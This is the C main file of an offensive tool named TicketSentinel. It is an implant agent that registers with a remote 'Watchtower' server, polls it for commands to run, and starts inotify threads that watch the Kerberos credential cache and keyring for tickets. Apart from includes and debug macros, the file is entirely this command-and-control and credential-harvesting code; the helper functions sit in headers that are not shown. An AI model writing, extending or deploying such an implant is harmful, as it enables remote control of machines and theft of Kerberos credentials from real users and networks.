


#define _GNU_SOURCE
#define DEBUG 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/inotify.h>
#include <pthread.h>
#include <unistd.h>
#include <limits.h>
#include <uuid/uuid.h>
#include "util/http_transport.h"
#include "util/commands.h"
#include "util/tickets.h"
#include "util/file_util.h"
#include "util/config.h"
#include "util/watcher.h"


#ifdef DEBUG
#define DBG(...) printf(__VA_ARGS__)
#else
#define DBG(...)
#endif


// Agent basic config
ticketsentinel_state_t agent_state = {0};


// Poll for new commands
static void *poll_helper(void *){
	while(1) {
		sleep(agent_state.sleep_time);
		char *urlPing;
		asprintf(&urlPing, "%s%s%s", URL, PING_URI, agent_state.uuid_agent);
		response_buffer_t response_watchtower = {0};
		if (ping(urlPing, &response_watchtower) == 0) {
			DBG("[*] Watchtower response: %zu bytes:\n", response_watchtower.size);
			//hex_dump((const unsigned char *)response_watchtower.data, response_watchtower.size);
			parse_commands(&response_watchtower, &agent_state);
			free(response_watchtower.data);
		}
		free(urlPing);
	}

	return NULL;
}

int main(int argc, char** argv) {

	pthread_t thread_poll;
	pthread_t thread_inotify_ccache;
        pthread_t thread_inotify_keyring;

	DBG("\t\t-=[ TicketSentinel - Juan Manuel Fernandez (@TheXC3LL) ]=-\n\n");

	// Initiate agent
	pthread_mutex_init(&agent_state.agent_lock, NULL);
	ticketsentinel_init(&agent_state);
	register_agent(&agent_state); // Change return to int and check for errors instead of using void
	pthread_create(&thread_poll, NULL, poll_helper, NULL);
	pthread_detach(thread_poll);


	// Initiate thread with the inotify checker (ccache)
	pthread_create(&thread_inotify_ccache, NULL, inotify_ccache, &agent_state);
	pthread_detach(thread_inotify_ccache);

        // Initiate thread with the inofit checker (keyring)
        pthread_create(&thread_inotify_keyring, NULL, inotify_keyring, &agent_state);
        pthread_detach(thread_inotify_keyring);        


	while(1) {
		sleep(3600);
	}
	return 0;
	}
